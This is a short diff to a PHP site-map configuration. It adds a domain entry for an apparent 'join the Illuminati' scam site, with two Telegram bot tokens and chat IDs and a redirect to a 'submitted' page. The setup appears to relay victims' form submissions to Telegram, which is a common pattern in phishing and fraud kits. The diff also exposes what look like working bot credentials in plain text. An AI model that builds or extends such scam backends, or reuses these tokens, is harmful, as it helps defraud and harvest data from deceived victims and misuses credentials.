@@ -45,6 +45,16 @@ $site_map = [
         "redirect" => "https://illuminatinetwork.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
     ],
 
+    'illuminaticonnect.world' => [
+        "bots" => [
+            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
+            ['token' => '8578491453:AAFjqP9TdTwv4IpsCJdghljt28y0yHqnYD8', 'chat_id' => '1972703470'],
+        ],
+        "redirect" => "https://illuminaticonnect.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
+    ],
+
+
+
 ];
 
 // === Logger setup ===
